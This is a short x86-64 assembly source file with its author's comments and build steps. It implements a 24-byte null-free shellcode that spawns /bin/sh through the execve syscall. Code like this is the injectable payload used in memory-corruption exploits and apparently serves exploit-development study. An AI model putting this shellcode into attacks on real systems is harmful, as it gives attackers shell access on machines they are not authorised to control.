// execve_sh.s
// executes execve("/bin/sh") assembler
// dan.dsod@gmail.com
// compile:
// as execve_sh -o execve_sh.o
// ld execve_sh.o -o execve_sh
// shows as 24bytes (as can be seen in test-sh.c)

.section .text
.globl _start
_start:
        push $0x3b
        pop %rax

	// use cltd to zero rdx reg for cheap
        cltd
        push %rdx

	// push /bin/sh into rdi reg leaving no nulls
	movabs $0x68732f6e69622f2f, %rdi
	push %rdi
	push %rsp
	pop %rdi
	xor %rsi, %rsi
	push %rsi
	syscall

